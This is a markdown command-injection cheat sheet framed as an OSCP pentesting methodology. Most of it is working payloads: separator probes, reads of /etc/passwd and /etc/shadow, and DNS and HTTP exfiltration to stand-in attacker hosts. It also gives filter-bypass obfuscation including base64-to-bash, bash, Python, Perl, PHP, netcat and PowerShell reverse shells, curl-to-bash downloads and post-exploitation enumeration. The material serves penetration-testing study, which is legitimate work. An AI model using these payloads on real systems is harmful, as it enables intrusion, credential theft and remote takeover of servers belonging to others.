# Command Injection — Complete OSCP Methodology


---

## Table of Contents

1. [What Is Command Injection](#1-what-is-command-injection)
2. [Detection & Injection Points](#2-detection--injection-points)
3. [In-Band Command Injection](#3-in-band-command-injection)
4. [Blind Command Injection — Time-Based](#4-blind-command-injection--time-based)
5. [Blind Command Injection — Out-of-Band (OOB)](#5-blind-command-injection--out-of-band)
6. [Blind Command Injection — Output Redirection](#6-blind-command-injection--output-redirection)
7. [Command Separators & Chaining](#7-command-separators--chaining)
8. [Filter Bypass Techniques](#8-filter-bypass-techniques)
9. [Argument Injection](#9-argument-injection)
10. [Reverse Shells](#10-reverse-shells)
11. [Post-Exploitation & Privilege Escalation](#11-post-exploitation--privilege-escalation)
12. [Automation & Tools](#12-automation--tools)
13. [Master Checklist](#13-master-checklist)
14. [External References](#14-external-references)

---

## 1. What Is Command Injection

The app passes user input to a system shell command without sanitization.

```
User input → app builds shell command → OS executes it → attacker controls the command
```

**Example vulnerable code:**

```php
// PHP
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
// Input: 127.0.0.1; whoami
// Executed: ping -c 4 127.0.0.1; whoami

// Python
os.system("nslookup " + user_input)

// Node.js
child_process.exec("ping -c 4 " + req.query.ip)
```

---

## 2. Detection & Injection Points

### Where to Look

- **Network tools** — ping, traceroute, nslookup, dig, whois
- **File operations** — filename, path, directory listing
- **PDF/image generators** — html-to-pdf, image conversion
- **Email features** — "from" address, subject fields
- **DNS lookups** — domain/hostname fields
- **System admin panels** — backup, restart, log viewers
- **Search/filter functions** — grep-based search
- **Any parameter used in server-side processing**

### Initial Probe Payloads

Try each of these — different ones work in different contexts:

```bash
# Semicolon
; whoami
; id
;id

# Pipe
| whoami
| id
|id

# Double pipe (OR — runs if first command fails)
|| whoami
|| id

# Ampersand (background — runs both commands)
& whoami
& id

# Double ampersand (AND — runs if first command succeeds)
&& whoami
&& id

# Newline
%0a whoami
%0a id
%0d%0a id

# Backticks (command substitution)
`whoami`
`id`

# $() command substitution
$(whoami)
$(id)

# Redirection
> /tmp/proof
```

### Quick Detection Test

```
Original request: ip=127.0.0.1
Test 1:           ip=127.0.0.1; whoami          → look for username in response
Test 2:           ip=127.0.0.1| whoami          → look for username in response
Test 3:           ip=127.0.0.1%0a whoami        → newline injection
Test 4:           ip=127.0.0.1 && whoami        → chained command
Test 5:           ip=`whoami`                   → command substitution
Test 6:           ip=$(whoami)                  → command substitution
```

---

## 3. In-Band Command Injection

Output of the injected command is displayed in the response.

```bash
# Basic extraction
; cat /etc/passwd
; cat /etc/shadow
; ls -la /home/
; env
; printenv
; cat /proc/self/environ
; id && hostname && ifconfig
; cat /var/www/html/config.php

# Windows
& type C:\Windows\System32\drivers\etc\hosts
& whoami /all
& net user
& dir C:\Users\
& type C:\inetpub\wwwroot\web.config
```

### Multiple Commands

```bash
; id; hostname; cat /etc/passwd
; id && hostname && cat /etc/passwd
| id; hostname; cat /etc/passwd
```

---

## 4. Blind Command Injection — Time-Based

No output visible. Use **time delays** to confirm injection.

### Linux

```bash
# Sleep
; sleep 5
| sleep 5
& sleep 5
&& sleep 5
|| sleep 5
`sleep 5`
$(sleep 5)

# Ping (count-based delay — 5 pings ≈ 5 seconds)
; ping -c 5 127.0.0.1
| ping -c 5 127.0.0.1

# Conditional delay (data extraction)
; if [ $(whoami | cut -c1) = "r" ]; then sleep 5; fi
; if [ $(cat /etc/passwd | wc -l) -gt 10 ]; then sleep 5; fi
```

### Windows

```bash
& ping -n 5 127.0.0.1
& timeout /t 5
& ping -n 5 127.0.0.1 >nul
```

### Data Extraction via Time

```bash
# Extract username character by character
; if [ $(whoami | cut -c1) = "a" ]; then sleep 5; fi    # test first char = 'a'
; if [ $(whoami | cut -c1) = "r" ]; then sleep 5; fi    # test first char = 'r'
; if [ $(whoami | cut -c2) = "o" ]; then sleep 5; fi    # test second char
# Continue for each character...
```

---

## 5. Blind Command Injection — Out-of-Band

Send the output **to your own server** via DNS or HTTP.

### DNS Exfiltration (Most Reliable — Works Through Firewalls)

```bash
# Using nslookup
; nslookup $(whoami).ATTACKER.com
; nslookup `whoami`.ATTACKER.com
; host $(whoami).ATTACKER.com

# Using dig
; dig $(whoami).ATTACKER.com

# Exfil multi-line data
; nslookup $(cat /etc/hostname).ATTACKER.com
; nslookup $(whoami | base64).ATTACKER.com

# Listen with:
# - Burp Collaborator
# - interactsh (https://app.interactsh.com)
# - Your own DNS server
```

### HTTP Exfiltration

```bash
# Using curl
; curl http://ATTACKER_IP/$(whoami)
; curl http://ATTACKER_IP/ -d $(cat /etc/passwd | base64)
; curl http://ATTACKER_IP/$(cat /etc/passwd | base64 | tr -d '\n')

# Using wget
; wget http://ATTACKER_IP/$(whoami)
; wget http://ATTACKER_IP/?data=$(id | base64)

# Exfil file contents
; curl http://ATTACKER_IP/ -F "file=@/etc/passwd"
; curl http://ATTACKER_IP/ --data-binary @/etc/passwd

# Listen on your machine:
python3 -m http.server 80
# or
nc -lvnp 80
```

### Windows OOB

```bash
# Using certutil
& certutil -urlcache -split -f http://ATTACKER_IP/%USERNAME% C:\temp\x.txt

# Using PowerShell
& powershell -c "Invoke-WebRequest http://ATTACKER_IP/$env:USERNAME"
& powershell -c "IWR http://ATTACKER_IP/$(whoami)"

# DNS
& nslookup %USERNAME%.ATTACKER.com
```

---

## 6. Blind Command Injection — Output Redirection

Write command output to a file in the web root, then read it via browser.

```bash
# Write to web root
; whoami > /var/www/html/output.txt
; id > /var/www/html/output.txt
; cat /etc/passwd > /var/www/html/output.txt

# Then browse to:
http://target.com/output.txt

# Common web roots:
/var/www/html/
/var/www/
/usr/share/nginx/html/
/srv/http/
/opt/lampp/htdocs/

# Windows
& whoami > C:\inetpub\wwwroot\output.txt
& type C:\Users\Administrator\Desktop\flag.txt > C:\inetpub\wwwroot\output.txt
```

---

## 7. Command Separators & Chaining

### All Separators Reference

| Separator | OS | Behavior |
|---|---|---|
| `;` | Linux | Always runs second command |
| `\|` | Both | Pipe output of first to second |
| `\|\|` | Both | Runs second ONLY if first FAILS |
| `&&` | Both | Runs second ONLY if first SUCCEEDS |
| `&` | Both | Runs both (second in background on Linux) |
| `\n` (`%0a`) | Linux | Newline = new command |
| `\r\n` (`%0d%0a`) | Both | Carriage return + newline |
| `` ` `` | Linux | Command substitution (inline) |
| `$()` | Linux | Command substitution (inline) |

### Choosing the Right Separator

```
; → First choice on Linux. Always works.
| → Second choice. Output of first becomes input of second.
|| → Use when the initial command must FAIL for yours to run.
&& → Use when the initial command must SUCCEED.
& → Use when you don't care about the first command's result.
%0a → Try when semicolon/pipe are filtered.
$() → Try for inline injection where you need the result substituted.
```

### Context Matters

```bash
# If your input goes INSIDE quotes:
ping -c 4 "[INPUT]"

# Break out of quotes first:
"; whoami; echo "
" | whoami | echo "
" && whoami && echo "

# If your input goes inside backticks or $():
result=`ping [INPUT]`
# Inject: 127.0.0.1`; whoami`

# If your input is a filename argument:
cat [INPUT]
# Inject: /etc/passwd
# Or: file.txt; whoami
```

---

## 8. Filter Bypass Techniques

### Spaces Blocked

```bash
# Use $IFS (Internal Field Separator = space/tab/newline)
;cat$IFS/etc/passwd
;cat${IFS}/etc/passwd
;cat$IFS$9/etc/passwd

# Use tabs (%09)
;cat%09/etc/passwd

# Use brace expansion
{cat,/etc/passwd}
{ls,-la,/home}

# Use < redirection (works as separator in some commands)
cat</etc/passwd

# Use $() with no spaces
$(cat</etc/passwd)
```

### Keywords Blocked (cat, whoami, id, etc.)

```bash
# Concatenation via quotes
c'a't /etc/passwd
c"a"t /etc/passwd
w'h'o'a'm'i

# Concatenation via variables
a=c;b=at;$a$b /etc/passwd
a=who;b=ami;$a$b

# Backslash insertion
c\at /etc/passwd
w\ho\am\i

# Wildcard/glob
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
/???/??t /etc/passwd       # /bin/cat

# Base64 decode and execute
echo "d2hvYW1p" | base64 -d | bash        # whoami
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash    # cat /etc/passwd

# Hex decode
echo "636174202f6574632f706173737764" | xxd -r -p | bash

# Rev (reverse the command)
echo "dssap/cte/ tac" | rev | bash

# Using $0 (current shell)
echo whoami | $0

# Environment variable extraction
echo ${PATH:0:1}           # '/' on most systems
```

### Slashes Blocked

```bash
# Use ${HOME} or environment variables
cat ${HOME}/../../etc/passwd
cat ${PATH%%:*}/../../../etc/passwd

# Use printf
cat $(printf '\x2f')etc$(printf '\x2f')passwd
```

### Specific Characters Blocked

```bash
# Semicolon blocked → use ||, &&, |, %0a, or $()
# Pipe blocked → use ;, &&, ||, %0a
# Ampersand blocked → use ;, |, %0a

# Dash/hyphen blocked
# Use environment variable or printf
ping $(printf '\x2d')c 1 127.0.0.1

# If multiple characters blocked, combine techniques:
# Example: spaces + semicolons + cat all blocked
{c'a't,$IFS/etc/passwd}
a=c;b=at;$a$b${IFS}/etc/passwd
```

### Blacklist Bypass Cheat Sheet

```bash
# Common alternatives for blocked commands
cat     → tac, more, less, head, tail, nl, sort, uniq, xxd, base64, rev
         strings, od, hexdump, fmt, fold, pr, column
         /bin/c?t, /bin/c*t, c''at, c""at, c\at
whoami  → id, w, who, logname, /usr/bin/w?o?m?, w'h'o'a'm'i
ls      → dir, find, echo *, printf '%s\n' *
ifconfig → ip a, ip addr, hostname -I
wget    → curl, fetch, lwp-download
nc      → ncat, bash /dev/tcp, python socket, perl socket
```

### Windows Filter Bypass

```bash
# Caret insertion (CMD)
w^h^o^a^m^i
n^e^t u^s^e^r

# Variable expansion
set a=who&& set b=ami&& %a%%b%

# Comma as delimiter (some commands)
ping,-n,1,127.0.0.1

# Percent-encoded characters
w%COMSPEC:~-16,1%oami    # Extracts 'h' from COMSPEC path

# PowerShell encoding
powershell -enc BASE64_ENCODED_COMMAND
```

---

## 9. Argument Injection

When user input becomes an **argument** to a fixed command (not the command itself):

```bash
# If the command is: tar cf archive.tar [INPUT]
# Inject arguments:
--checkpoint=1 --checkpoint-action=exec=/bin/sh

# If the command is: find [INPUT] -name "*.txt"
# Inject: -exec whoami ;

# If the command is: git log [INPUT]
# Inject: --output=/tmp/output -p

# Common exploitable arguments:
# tar: --checkpoint-action=exec=CMD
# find: -exec CMD ;
# git: --upload-pack=CMD
# rsync: -e CMD
# zip: --unzip-command=CMD
# wget: --post-file=/etc/passwd
# curl: -o /var/www/html/shell.php http://ATTACKER/shell.php
```

---

## 10. Reverse Shells

### Start Your Listener First

```bash
nc -lvnp 4444
# or
rlwrap nc -lvnp 4444    # with readline for arrow keys
```

### Linux Reverse Shells

```bash
# Bash
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Python
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
; perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
; php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (traditional)
; nc -e /bin/sh ATTACKER_IP 4444

# Netcat (no -e, OpenBSD)
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# Curl to shell script
; curl http://ATTACKER_IP/shell.sh | bash

# wget to shell script
; wget http://ATTACKER_IP/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
```

### Windows Reverse Shells

```bash
# PowerShell
& powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}"

# PowerShell encoded
# Generate: echo -n '<payload>' | iconv -t UTF-16LE | base64 -w0
& powershell -enc <BASE64>

# Certutil download + execute
& certutil -urlcache -split -f http://ATTACKER_IP/nc.exe C:\temp\nc.exe && C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe
```

### Upgrade to Full TTY

```bash
# After getting a reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then:
# Ctrl+Z (background the shell)
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 cols 160
```

---

## 11. Post-Exploitation & Privilege Escalation

### Immediate Enumeration After Shell

```bash
# Who am I and what can I do?
id
whoami
hostname
uname -a
cat /etc/os-release

# Network
ip a
ifconfig
netstat -tulnp
ss -tulnp

# Users
cat /etc/passwd
cat /etc/shadow    # if readable = jackpot
ls -la /home/

# Sudo
sudo -l            # what can I run as root?

# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
crontab -l

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Config files with credentials
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" 2>/dev/null | head -20
cat /var/www/html/*.php | grep -i "pass\|user\|db\|key\|secret"
```

### Windows Enumeration

```bash
whoami /all
net user
net localgroup Administrators
systeminfo
ipconfig /all
netstat -an
tasklist
type C:\Users\*\Desktop\*.txt
dir /s /b C:\Users\*\*password*
reg query HKLM /f password /t REG_SZ /s
```

---

## 12. Automation & Tools

### Commix

```bash
# Install
pip3 install commix

# Basic test
commix -u "http://target.com/page?ip=127.0.0.1"

# POST data
commix -u "http://target.com/page" --data="ip=127.0.0.1"

# With cookies
commix -u "http://target.com/page?ip=127.0.0.1" --cookie="session=abc123"

# Force specific technique
commix -u "http://target.com/page?ip=127.0.0.1" --technique=t    # time-based
commix -u "http://target.com/page?ip=127.0.0.1" --technique=f    # file-based

# Get shell
commix -u "http://target.com/page?ip=127.0.0.1" --os-cmd="id"

# Specify OS
commix -u "http://target.com/page?ip=127.0.0.1" --os=linux
```

### Manual Testing with Burp

```
1. Capture the request in Burp
2. Send to Repeater
3. Test each parameter with command separators
4. Send to Intruder for automated separator fuzzing:
   - Payload = list of separators + commands
   - Grep match for "uid=", "root:", "www-data", etc.
```

---

## 13. Master Checklist

### Detection

- [ ] Identify all parameters that could interact with OS commands
- [ ] Test every parameter with `;`, `|`, `||`, `&&`, `&`
- [ ] Test with newline characters (`%0a`, `%0d%0a`)
- [ ] Test command substitution (`` ` `` and `$()`)
- [ ] Test in both GET and POST parameters
- [ ] Test in HTTP headers (User-Agent, Referer, X-Forwarded-For)
- [ ] Test in Cookie values
- [ ] Test in file upload filenames
- [ ] Test in JSON/XML body values

### Blind Confirmation

- [ ] Time-based: `sleep 5`, `ping -c 5 127.0.0.1`
- [ ] OOB DNS: `nslookup $(whoami).YOUR_DOMAIN`
- [ ] OOB HTTP: `curl http://YOUR_IP/$(whoami)`
- [ ] Output redirect: `whoami > /var/www/html/out.txt`

### Exploitation

- [ ] Extract `/etc/passwd`
- [ ] Extract `/etc/shadow` (if readable)
- [ ] Read application config files for credentials
- [ ] Check `sudo -l` for privilege escalation paths
- [ ] Check SUID binaries
- [ ] Get a reverse shell
- [ ] Upgrade to full TTY

### Filter Bypass

- [ ] If spaces blocked → `$IFS`, `%09`, `{cmd,arg}`, `<`
- [ ] If commands blocked → quotes (`c'a't`), backslash (`c\at`), wildcards (`/bin/c?t`)
- [ ] If semicolons blocked → `||`, `&&`, `|`, `%0a`, `$()`
- [ ] If slashes blocked → environment variables, `printf`
- [ ] Base64 encode entire command → `echo b64 | base64 -d | bash`
- [ ] Hex encode → `echo hex | xxd -r -p | bash`

### Privilege Escalation

- [ ] `sudo -l` — commands as root without password?
- [ ] SUID binaries → check GTFOBins
- [ ] Writable cron jobs?
- [ ] Kernel exploits (check `uname -a`)
- [ ] Docker group membership?
- [ ] Credentials in config files / environment?
- [ ] SSH keys readable?
- [ ] Password reuse from DB creds?

---

## 14. External References

- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [HackTricks — Command Injection](https://book.hacktricks.wiki/en/pentesting-web/command-injection.html)
- [GTFOBins — Unix Binaries Privilege Escalation](https://gtfobins.github.io/)
- [LOLBAS — Windows Living Off The Land](https://lolbas-project.github.io/)
- [RevShells — Reverse Shell Generator](https://www.revshells.com/)
- [Commix — Automated Command Injection](https://github.com/commixproject/commix)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
